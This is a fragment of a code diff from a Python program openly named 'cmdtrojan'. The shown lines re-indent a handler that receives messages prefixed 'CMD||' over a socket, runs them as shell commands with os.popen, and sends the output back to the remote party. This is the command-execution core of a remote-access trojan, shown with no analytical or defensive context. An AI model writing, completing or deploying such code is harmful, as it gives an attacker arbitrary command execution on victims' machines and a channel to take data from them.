@@ -40,10 +40,10 @@ class cmdtrojan:
             if not data:
                 continue
             elif data.startswith("CMD||"):
-                a = os.popen(data.split('||')[1])
-                feedback = a.read()
-                print(feedback)
-                client_socket.send(feedback.encode())
+                    a = os.popen(data.split('||')[1])
+                    feedback = a.read()
+                    print(feedback)
+                    client_socket.send(feedback.encode())
             print(data)
 
     def getLocalIP(self):
